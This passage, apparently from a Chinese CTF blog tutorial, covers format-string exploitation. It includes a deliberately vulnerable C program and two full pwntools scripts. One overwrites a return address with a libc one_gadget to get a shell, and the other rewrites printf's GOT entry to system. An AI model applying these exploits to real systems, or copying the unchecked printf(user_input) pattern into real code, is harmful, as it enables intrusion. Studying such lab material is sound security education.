class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nonono\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *b=(<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x40</span>);;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (vuln(b)==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input username:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%20s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;s password:&quot;</span>);</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>main函数代码<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p>main函数栈布局<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-2.jpg"></p>
+</blockquote>
+<blockquote>
+<p>func函数代码<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-3.jpg"></p>
+</blockquote>
+<blockquote>
+<p>func函数栈布局<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-4.jpg"></p>
+</blockquote>
+<blockquote>
+<p>vuln函数代码<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-5.jpg"></p>
+</blockquote>
+<blockquote>
+<p>泄露栈中数据<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1.jpg"><br>先通过多个 %p 泄露栈中的数据，用来查找可以利用的地址</p>
+</blockquote>
+<p>这个样例符合条件，其中<code>main</code>函数调用<code>func</code>函数,<code>func</code>函数调用<code>vuln</code>函数<br>这样在栈中 至少保存了<code>main</code>函数的<code>rbp</code>与<code>func</code>函数的<code>rbp</code><br>而<code>func</code>函数的<code>rbp</code>指向的地址储存的是<code>main</code>函数的<code>rbp</code>的值<br>刚好形成一个链表</p>
+<p>在这个样例中，因为可以利用栈达到任意地址读写，做法也就多种多样了<br>这里演示了控制返回地址为<code>gadget</code>获取<code>shell</code>，还可以通过设置<code>got表</code>调用<code>system</code>函数</p>
+<h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;exp思路</span></span><br><span class="line"><span class="string">    因为是在栈中，可以控制函数的返回地址</span></span><br><span class="line"><span class="string">    这个攻击代码中，设置main函数返回地址为 libc中调用execve(&quot;/bin/sh&quot;)的代码地址</span></span><br><span class="line"><span class="string">    还要把储存__libc_start_main函数rbp指针的位置写入新的rbp</span></span><br><span class="line"><span class="string">    而且这个rbp一定要大于 rsp且处于可写地址,否则会导致程序报错中断</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> gadget <span class="keyword">in</span> [<span class="number">0xde78c</span>,<span class="number">0xde78f</span>,<span class="number">0xde792</span>]:</span><br><span class="line">    libc=ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">    e=ELF(<span class="string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">    p=process(<span class="string">&#x27;./pwn_format&#x27;</span>)</span><br><span class="line">    libc_ind=<span class="number">13</span></span><br><span class="line">    p.read()</span><br><span class="line">    p.sendline(<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(libc_ind)+<span class="string">&#x27;$p&#x27;</span>)</span><br><span class="line">    c=<span class="built_in">int</span>(p.readuntil(<span class="string">&#x27;\&#x27;s&#x27;</span>,drop=<span class="number">1</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(c))</span><br><span class="line"></span><br><span class="line">    libc.address=c-<span class="number">213</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    sind=<span class="number">8</span></span><br><span class="line">    eind=<span class="number">12</span></span><br><span class="line">    p.readuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;%&#123;&#125;$p.%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(sind,eind))</span><br><span class="line">    data=p.read()[:-<span class="number">7</span>].split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    s1=<span class="built_in">int</span>(data[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">    s2=<span class="built_in">int</span>(data[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(s1),<span class="built_in">hex</span>(s2))</span><br><span class="line"></span><br><span class="line">    ori=s2&amp;<span class="number">0xff</span></span><br><span class="line">    ret=ori</span><br><span class="line">    one_gadget=p64(libc.address+gadget)</span><br><span class="line">    data=p64(s1+<span class="number">0x200</span>)+one_gadget</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address+gadget))</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;<span class="number">16</span>:</span><br><span class="line">        payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(ret+i,sind)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(data[i])==<span class="number">0</span>:</span><br><span class="line">            payload=<span class="string">&#x27;%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(eind)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(data[i]),eind)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(ori,sind)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;exp思路</span></span><br><span class="line"><span class="string">    因为 printf 函数与 system 函数属于同一个 libc，所以两个函数的真实地址也相近，</span></span><br><span class="line"><span class="string">    想要将printf改成system 函数，只需要修改低两个字节，</span></span><br><span class="line"><span class="string">    所以我们将 printf.got 与 printf.got+2 写入栈中</span></span><br><span class="line"><span class="string">    然后再 将 printf.got 中储存的低四字节替换为 system函数地址 的低四字节</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn_format&#x27;</span>)</span><br><span class="line">libc_ind=<span class="number">13</span></span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(libc_ind)+<span class="string">&#x27;$p&#x27;</span>)</span><br><span class="line">c=<span class="built_in">int</span>(p.readuntil(<span class="string">&#x27;\&#x27;s&#x27;</span>,drop=<span class="number">1</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(c))</span><br><span class="line"></span><br><span class="line">libc.address=c-<span class="number">213</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">printf_got=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sind=<span class="number">8</span></span><br><span class="line">eind=<span class="number">12</span></span><br><span class="line">p.readuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%&#123;&#125;$p.%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(sind,eind))</span><br><span class="line">data=p.read()[:-<span class="number">7</span>].split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">s1=<span class="built_in">int</span>(data[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">s2=<span class="built_in">int</span>(data[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(s1),<span class="built_in">hex</span>(s2))</span><br><span class="line"></span><br><span class="line">ori=s2&amp;<span class="number">0xff</span></span><br><span class="line">ret=ori</span><br><span class="line">data=p64(printf_got)+p64(printf_got+<span class="number">2</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">16</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(ret+i,sind)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(data[i])==<span class="number">0</span>:</span><br><span class="line">        payload=<span class="string">&#x27;%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(eind)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(data[i]),eind)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(ori,sind)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">e=&#123;<span class="number">0</span>:system&amp;<span class="number">0xffff</span>,<span class="number">1</span>:((system&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>)&#125;</span><br><span class="line">n=[<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">n.sort(key=<span class="keyword">lambda</span> d:e[d])</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hn%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="built_in">format</span>(e[n[<span class="number">0</span>]],<span class="number">20</span>+n[<span class="number">0</span>],e[n[<span class="number">1</span>]]-e[n[<span class="number">0</span>]],<span class="number">20</span>+n[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/rot-will">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+        
+        
+        <li>
+            <a target="_blank"  href="tencent://message/?Site=admin5.com&menu=yes&uin=2127361651">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-qq-fill"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a target="_blank" rel="noopener" href="https://www.lewiserii.top">lewiserii</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://giscus.app/client.js"
+  data-repo="rot-will/rot-will.github.io"
+  data-repo-id="R_kgDOHgxmbg"
+  data-category="Announcements"
+  data-category-id="DIC_kwDOHgxmbs4CPuLX"
+  data-mapping="url"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="bottom"
+  data-theme="light"
+  data-lang="zh-CN"
+  crossorigin="anonymous"
+  async>
+</script>
+
+
+
+
+</html>
